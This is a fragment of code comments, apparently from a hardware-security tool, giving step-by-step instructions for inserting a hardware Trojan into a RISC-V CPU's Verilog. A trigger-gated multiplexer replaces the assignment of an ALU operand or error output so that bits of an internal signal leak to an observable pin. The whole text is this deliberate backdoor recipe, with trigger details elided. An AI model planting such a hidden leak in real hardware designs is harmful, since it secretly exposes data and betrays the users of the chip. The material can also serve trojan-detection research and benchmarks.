 ...
 * Payload: Route alu_operand_a_i[0] to observable output
 * 
...
//   Find the assign for alu_operand_a_i (or rd_error_o as fallback):
//     assign alu_operand_a_i = <normal_expr>;
//   Replace with:
//     assign alu_operand_a_i = trojan_active ? multdiv_signed_mode_i[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? multdiv_signed_mode_i[0] : 1'b0;
//
